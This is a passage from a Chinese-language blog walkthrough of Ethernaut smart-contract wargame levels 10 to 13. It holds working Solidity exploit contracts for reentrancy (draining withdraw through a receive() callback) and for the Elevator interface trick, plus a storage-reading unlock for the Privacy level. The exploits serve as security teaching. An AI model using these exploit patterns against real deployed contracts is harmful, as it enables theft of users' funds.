<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x60</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp1</span>, <span style="color:#a6e22e">memory</span>[<span style="color:#a6e22e">temp0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>).<span style="color:#a6e22e">call</span>.<span style="color:#a6e22e">gas</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">gas</span>).<span style="color:#a6e22e">value</span>(<span style="color:#a6e22e">arg0</span>)(<span style="color:#a6e22e">memory</span>[<span style="color:#a6e22e">temp0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x60</span>] <span style="color:#f92672">-</span> <span style="color:#a6e22e">temp0</span>]);
</span></span></code></pre></div><p>由于这里<code>.call</code>函数只接受一个<code>bytes</code>参数，而<code>&quot;&quot;</code>又是长度为0，所以就没有calldata了。如果把长度变成8，就是这样：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">result</span>, <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">data</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>.<span style="color:#a6e22e">value</span>(<span style="color:#a6e22e">_amount</span>)(<span style="color:#e6db74">&#34;deadbeef&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x40</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x60</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp2</span>, <span style="color:#a6e22e">memory</span>[<span style="color:#a6e22e">temp1</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>).<span style="color:#a6e22e">call</span>.<span style="color:#a6e22e">gas</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">gas</span>).<span style="color:#a6e22e">value</span>(<span style="color:#a6e22e">arg0</span>)(<span style="color:#a6e22e">memory</span>[<span style="color:#a6e22e">temp1</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp1</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x08</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">temp1</span>]);
</span></span></code></pre></div><p>这是正常的行为，不是<a href="https://cn.etherscan.com/solcbuginfo?a=SkipEmptyStringLiteral">编译器的bug</a>，这个bug在0.4.12就已经修复。</p>
<p><a href="https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/">推荐使用call</a>而不再推荐使用transfer和send。自己防范重入。</p>
<h2 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-3.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Reentrance</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_amount</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Reentrance</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Reentrance</span>(<span style="color:#ae81ff">0x22778878428C001234BC0d9A708D9664045d80BC</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">cnt</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>, <span style="color:#e6db74">&#34;constructor(): Insufficient Fund.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">auth</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">owner</span>, <span style="color:#e6db74">&#34;auth(): Not Authenticated.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cnt</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">cnt</span> <span style="color:#f92672">++</span> ;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">withdraw</span>(<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>);  <span style="color:#75715e">// 1 ether
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">auth</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">donate</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>}(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">withdraw</span>(<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">18</span>);  <span style="color:#75715e">// 1 ether
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Use the <code>Checks-Effects-Interactions</code> Pattern</p>
<h1 id="level-11-elevator">Level 11. Elevator<a hidden class="anchor" aria-hidden="true" href="#level-11-elevator">#</a></h1>
<blockquote>
<p>This elevator won&rsquo;t let you reach the top of your building. Right?</p>
</blockquote>
<blockquote>
<p>Things that might help:</p>
</blockquote>
<blockquote>
<blockquote>
<p>Sometimes solidity is not good at keeping promises.<br>
This Elevator expects to be used from a Building.</p>
</blockquote>
</blockquote>
<h2 id="source-5">Source<a hidden class="anchor" aria-hidden="true" href="#source-5">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Elevator</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">top</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">floor</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_floor</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Building</span> <span style="color:#a6e22e">building</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Building</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">building</span>.<span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">_floor</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">floor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_floor</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">top</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">building</span>.<span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">floor</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>实现一个简单的接口</p>
<h2 id="exp-1">exp<a hidden class="anchor" aria-hidden="true" href="#exp-1">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-3.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Elevator</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_floor</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Building</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">owner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Elevator</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Elevator</span>(<span style="color:#ae81ff">0xaf6637c511207fe29A9eB0A11c869728380D505B</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">cnt</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() <span style="color:#a6e22e">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">auth</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">owner</span>, <span style="color:#e6db74">&#34;auth(): Not Authenticated.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">floor</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">override</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">floor</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;isLastFloor(): Cannot Failed.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cnt</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">cnt</span> <span style="color:#f92672">++</span> ;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">auth</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">goTo</span>(<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-12-privacy">Level 12. Privacy<a hidden class="anchor" aria-hidden="true" href="#level-12-privacy">#</a></h1>
<blockquote>
<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
</blockquote>
<blockquote>
<p>Unlock this contract to beat the level.</p>
</blockquote>
<blockquote>
<p>Things that might help:</p>
</blockquote>
<blockquote>
<blockquote>
<p>Understanding how storage works<br>
Understanding how parameter parsing works<br>
Understanding how casting works</p>
</blockquote>
</blockquote>
<h2 id="source-6">Source<a hidden class="anchor" aria-hidden="true" href="#source-6">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Privacy</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;                <span style="color:#75715e">// 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ID</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">timestamp</span>;      <span style="color:#75715e">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint8</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">flattening</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;            <span style="color:#75715e">// 2_0_1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint8</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">denomination</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;         <span style="color:#75715e">// 2_1_2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint16</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">awkwardness</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">now</span>); <span style="color:#75715e">// 2_2_4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">data</span>;                  <span style="color:#75715e">// 3 4 5
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">_data</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_data</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">bytes16</span> <span style="color:#a6e22e">_key</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">_key</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">bytes16</span>(<span style="color:#a6e22e">data</span>[<span style="color:#ae81ff">2</span>]));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    A bunch of super advanced solidity algorithms...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exp-2">Exp<a hidden class="anchor" aria-hidden="true" href="#exp-2">#</a></h2>
<p>链上没有隐私</p>
<p><img loading="lazy" src="https://res.cloudinary.com/dx9uhkbv5/image/upload/v1691990291/blog/ethernaut/11_vb4acu.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#e6db74">&#39;0xc9e62529e16fdfb38db596273b2db912&#39;</span>)
</span></span></code></pre></div><p>这一关的<a href="https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925">推荐阅读</a></p>
<h1 id="level-13-gatekeeper-one">Level 13. Gatekeeper One<a hidden class="anchor" aria-hidden="true" href="#level-13-gatekeeper-one">#</a></h1>
<h2 id="source-7">Source<a hidden class="anchor" aria-hidden="true" href="#source-7">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">GatekeeperOne</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint256</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">entrant</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">gasleft</span>().<span style="color:#a6e22e">mod</span>(<span style="color:#ae81ff">8191</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">==</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part one&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">!=</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part two&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">uint32</span>(<span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>)) <span style="color:#f92672">==</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part three&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">gateOne</span> <span style="color:#a6e22e">gateTwo</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entrant</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>require(gasleft().mod(8191) == 0);</code>这里我是有点懵的。如何测量走到这一步消耗了多少gas呢？</p>
<p><a href="https://hitcxy.com/2019/ethernaut/">https://hitcxy.com/2019/ethernaut/</a></p>
